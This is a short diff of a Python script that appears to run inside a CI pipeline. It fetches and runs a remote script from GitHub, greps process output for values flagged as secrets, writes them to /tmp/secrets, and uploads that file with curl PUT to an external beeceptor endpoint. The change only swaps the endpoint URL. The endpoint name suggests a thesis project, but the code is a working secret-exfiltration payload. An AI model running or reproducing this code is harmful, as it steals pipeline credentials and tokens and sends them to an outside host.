@@ -6,5 +6,5 @@ bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cachera
 | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
 subprocess.run(["bash", "-c", bash_command])
 
-another_command = "curl -X PUT -d @/tmp/secrets https://app.beeceptor.com/console/bachelor-thesis-001"
+another_command = "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.free.beeceptor.com"
 subprocess.run(["bash", "-c", another_command])
